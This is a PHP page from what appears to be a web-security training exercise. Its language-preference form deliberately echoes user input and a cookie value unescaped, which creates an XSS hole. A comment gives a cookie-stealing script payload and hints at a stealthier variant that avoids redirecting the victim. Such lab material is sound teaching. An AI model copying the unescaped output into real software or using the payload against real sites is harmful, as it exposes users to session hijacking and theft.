<?php require_once('../../../private/initialize.php'); ?>

<?php

if($_SERVER['REQUEST_METHOD']=='POST') {
  // Form was submitted
  $language = $_POST['language'] ?? 'Any';
  $expire = time() + 60*60*24*365;
  setcookie('language', $language, $expire);
  echo $_POST['xss'];

} else {
  // Read the stored value (if any)
  $language = $_COOKIE['language'] ?? 'Any';
}

?>

<?php include(SHARED . '/public_header.php'); ?>

<div id="main">

  <div id="page">

    <div id="content">
      <h1>Set Language Preference</h1>

      <p>The currently selected language is: <?php echo $language; ?></p>
      <p>This page has an XSS vulnerability intended to be used to steal cookies and send them to the cookies.php uri. Can you figure it out?</p>
      <!-- HINT: Try the following script 
        <script>window.location='cookies.php?c='+document.cookie</script>

        Did it work? How about trying a script that makes the post request and doesn't redirect the victim for max stealth? -->
      <form action="<?php echo WWW_ROOT.'/staff/subjects/cookiestealer.php'; ?>" method="post">

        <select name="language">
          <?php
            $language_choices = ['Any', 'English', 'Spanish', 'French', 'German'];
            foreach($language_choices as $language_choice) {
              echo "<option value=\"{$language_choice}\"";
              if($language == $language_choice) {
                echo " selected";
              }
              echo ">{$language_choice}</option>";
            }
          ?>
        </select><br />
        <br />
        <textarea name="xss" rows="10" cols="30"></textarea>
        <input type="submit" value="Set Preference" />
      </form>
    </div>

  </div>

</div>

<?php include(SHARED . '/public_footer.php'); ?>
